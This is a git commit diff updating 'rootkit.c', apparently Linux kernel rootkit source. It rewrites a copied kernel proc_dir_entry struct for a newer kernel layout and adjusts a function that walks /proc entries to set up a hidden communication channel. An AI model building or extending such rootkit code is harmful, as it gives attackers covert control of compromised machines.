ec6dc90e501f40428a498a127474031cc3ea1c14
Juan Schällibaum <juanschallibaum@hotmail.com>
2018-07-29 07:12:03 -0300

    Update rootkit.c

--- rootkit.c
+++ rootkit.c
@@ -75,25 +75,32 @@ struct proc_dir_entry {
 	 * negative -> it's going away RSN
 	 */
 	atomic_t in_use;
-	atomic_t count;		/* use count */
+	refcount_t refcnt;
 	struct list_head pde_openers;	/* who did ->open, but not ->release */
 	/* protects ->pde_openers and all struct pde_opener instances */
 	spinlock_t pde_unload_lock;
 	struct completion *pde_unload_completion;
 	const struct inode_operations *proc_iops;
 	const struct file_operations *proc_fops;
+	union {
+		const struct seq_operations *seq_ops;
+		int (*single_show)(struct seq_file *, void *);
+	};
+	proc_write_t write;
 	void *data;
+	unsigned int state_size;
 	unsigned int low_ino;
 	nlink_t nlink;
 	kuid_t uid;
 	kgid_t gid;
 	loff_t size;
 	struct proc_dir_entry *parent;
-	struct rb_root_cached subdir;
+	struct rb_root subdir;
 	struct rb_node subdir_node;
+	char *name;
 	umode_t mode;
 	u8 namelen;
-	char name[];
+	char inline_name[];
 };
 
 
@@ -1099,7 +1106,7 @@ int setup_proc_comm_channel(void)
     #endif
     */
 	
-    entry = rb_first(&proc_entry->subdir.rb_root);
+    entry = rb_first(&proc_entry->subdir);
 
     while (entry) {
         pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);
